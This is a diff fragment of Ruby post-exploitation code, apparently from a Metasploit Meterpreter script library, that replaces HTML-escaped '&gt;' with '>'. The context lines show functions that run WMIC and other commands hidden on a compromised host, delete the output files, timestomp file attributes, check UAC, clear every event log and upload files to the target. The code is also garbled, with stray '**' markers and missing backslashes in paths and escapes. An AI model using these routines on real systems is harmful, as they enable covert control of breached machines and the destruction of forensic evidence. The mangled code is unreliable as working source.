@@ -42,7 +42,7 @@ def wmicexec**(**session,wmiccmds**=** nil**)**
                         print_status "running command wmic #{wmi}"
                         cmd **=** "cmd.exe /c %SYSTEMROOT%system32wbemwmic.exe"
                         opt **=** "/append:#{wmicfl} #{wmi}"
-                        r **=** session.sys.process.execute**(** cmd, opt,**{**'Hidden' **=&gt;** true**})**
+                        r **=** session.sys.process.execute**(** cmd, opt,**{**'Hidden' **=>** true**})**
                         sleep**(**2**)**
                         #Making sure that wmic finnishes before executing next wmic command
                         prog2check **=** "wmic.exe"
@@ -62,14 +62,14 @@ def wmicexec**(**session,wmiccmds**=** nil**)**
                 # Read the output file of the wmic commands
                 wmioutfile **=** session.fs.file.new**(**wmicfl, "rb"**)**
                 **until **wmioutfile.eof?
-                        tmpout **&gt;&gt;** wmioutfile.read
+                        tmpout **>>** wmioutfile.read
                 end
                 wmioutfile.close
-        rescue ::Exception **=&gt;** e
+        rescue ::Exception **=>** e
                 print_status**(**"Error running WMIC commands: #{e.class} #{e}"**)**
         end
         # We delete the file with the wmic command output.
-        c **=** session.sys.process.execute**(**"cmd.exe /c del #{wmicfl}", nil, **{**'Hidden' **=&gt;** true**})**
+        c **=** session.sys.process.execute**(**"cmd.exe /c del #{wmicfl}", nil, **{**'Hidden' **=>** true**})**
         c.close
         tmpout
 end
@@ -94,7 +94,7 @@ def chmace**(**session,cmds**)**
             print_status**(**"tChanging file MACE attributes on #{filetostomp}"**)**
             session.priv.fs.set_file_mace_from_file**(**filetostomp, fl2clone**)**
 
-        rescue ::Exception **=&gt;** e
+        rescue ::Exception **=>** e
             print_status**(**"Error changing MACE: #{e.class} #{e}"**)**
         end
     end
@@ -125,7 +125,7 @@ def checkuac**(**session**)**
             end
             open_key.close_key**(**key**)**
         end
-    rescue ::Exception **=&gt;** e
+    rescue ::Exception **=>** e
         print_status**(**"Error Checking UAC: #{e.class} #{e}"**)**
     end
     **return **uac
@@ -155,7 +155,7 @@ def clrevtlgs**(**session**)**
             log.clear
         end
         print_status**(**"Alll Event Logs have been cleared"**)**
-    rescue ::Exception **=&gt;** e
+    rescue ::Exception **=>** e
         print_status**(**"Error clearing Event Log: #{e.class} #{e}"**)**
 
     end
@@ -178,14 +178,14 @@ def list_exec**(**session,cmdlst**)**
     cmdlst.each **do** |cmd|
         begin
             print_status "trunning command #{cmd}"
-            r **=** session.sys.process.execute**(**cmd, nil, **{**'Hidden' **=&gt;** true, 'Channelized' **=&gt;** true**})**
+            r **=** session.sys.process.execute**(**cmd, nil, **{**'Hidden' **=>** true, 'Channelized' **=>** true**})**
             **while****(**d **=** r.channel.read**)**
 
                 print_status**(**"t#{d}"**)**
             end
             r.channel.close
             r.close
-        rescue ::Exception **=&gt;** e
+        rescue ::Exception **=>** e
             print_error**(**"Error Running Command #{cmd}: #{e.class} #{e}"**)**
         end
     end
@@ -217,7 +217,7 @@ def upload**(**session,file,trgloc **=** nil**)**
             session.fs.file.upload_file**(**"#{fileontrgt}","#{file}"**)**
             print_status**(**"#{file} uploaded!"**)**
             print_status**(**"#{fileontrgt}"**)**
-        rescue ::Exception **=&gt;** e
+        rescue ::Exception **=>** e
             print_status**(**"Error uploading file #{file}: #{e.class} #{e}"**)**
         end
     end
